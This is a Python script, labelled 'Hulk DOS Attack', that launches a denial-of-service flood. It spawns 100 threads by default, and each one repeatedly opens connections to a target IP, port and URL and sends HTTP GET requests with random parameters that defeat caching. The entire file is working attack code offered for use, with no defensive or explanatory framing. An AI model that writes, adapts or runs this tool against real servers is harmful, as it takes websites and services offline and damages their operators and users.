import socket
import threading
import argparse
import random
import string

def generate_random_param(size):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

class HulkDOS(threading.Thread):
    def __init__(self, dst_ip, port, url):
        threading.Thread.__init__(self)
        self.url = url
        self.dst_ip = dst_ip
        self.port = port
        self.running = True

    def send_request(self):
        param = generate_random_param(10)
        url_with_params = f"{self.url}?param={param}"
        request = f"GET {url_with_params} HTTP/1.1\r\nHost: {self.dst_ip}\r\n\r\n"
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((self.dst_ip, self.port))
            sock.sendall(request.encode('utf-8'))

    def run(self):
        while self.running:
            self.send_request()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hulk DOS Attack")
    parser.add_argument("dst_ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--threads", type=int, help="Number of threads", default=100)
    args = parser.parse_args()

    threads = []
    for _ in range(args.threads):
        hulk_dos = HulkDOS(args.dst_ip, args.port, args.url)
        threads.append(hulk_dos)
        hulk_dos.start()

    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        for thread in threads:
            thread.running = False